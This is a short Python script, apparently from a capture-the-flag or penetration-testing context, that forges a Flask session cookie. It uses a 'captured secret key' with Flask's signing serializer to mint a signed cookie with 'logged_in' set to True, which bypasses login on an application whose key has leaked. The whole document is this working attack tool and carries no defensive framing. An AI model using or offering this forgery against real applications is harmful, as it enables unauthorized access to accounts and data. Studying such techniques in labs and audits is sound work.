from itsdangerous import URLSafeTimedSerializer
from flask.sessions import SecureCookieSessionInterface
from flask import Flask

app = Flask(__name__)
app.secret_key = "replace key"  # replace with captured secret key

session_interface = SecureCookieSessionInterface()

with app.app_context():
    signing_serializer = session_interface.get_signing_serializer(app)
    
    session_data = {"logged_in": True}

    session_cookie_value = signing_serializer.dumps(session_data)

    print(f"Generated session cookie: {session_cookie_value}")
